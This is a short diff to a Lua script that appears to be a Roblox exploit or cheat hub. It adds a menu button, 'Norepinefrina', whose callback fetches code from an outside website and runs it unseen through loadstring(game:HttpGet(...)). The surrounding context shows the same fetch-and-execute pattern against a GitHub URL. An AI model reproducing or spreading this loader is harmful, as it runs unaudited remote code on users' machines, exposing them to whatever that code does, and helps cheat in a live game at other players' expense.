@@ -335,6 +335,11 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/
     print('Hello!')
 end)
 
+tab.newButton("Norepinefrina", "One of the goat", function()
+loadstring(game:HttpGet("https://norepinefrina.com"))()
+    print('Hello!')
+end)
+
 -- Exclusives Number 3 tab for some scripts
 local tab = DrRayLibrary.newTab("ExclusiveS 3", "ImageIdHere")
 
